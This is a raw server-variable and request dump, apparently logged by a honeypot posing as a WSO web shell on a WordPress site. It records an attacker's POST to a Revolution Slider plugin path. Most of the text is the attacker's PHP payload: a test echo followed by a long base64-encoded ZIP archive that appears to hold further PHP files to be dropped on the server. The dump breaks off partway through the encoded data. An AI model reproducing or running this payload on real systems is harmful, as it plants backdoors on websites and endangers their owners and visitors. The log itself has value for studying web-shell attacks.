
_SERVER
Array
(
    [UNIQUE_ID] => WuzkCfP0R273YoruookFOAAAAA0
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => www.stratigery.com
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.109 Safari/537.36
    [HTTP_ACCEPT] => */*
    [HTTP_CACHE_CONTROL] => no-cache
    [CONTENT_LENGTH] => 195999
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [HTTP_EXPECT] => 100-continue
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.33 (Unix) PHP/7.2.5
    [SERVER_NAME] => www.stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 31.184.234.175
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 53912
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1525474313.54
    [REQUEST_TIME] => 1525474313
)

_REQUEST
Array
(
    [a] => Php
    [c] => 
    [p1] => $a="<?php 
if( isset($_REQUEST["test_url"]) ){
echo "file test okay";

}


$data = base64_decode("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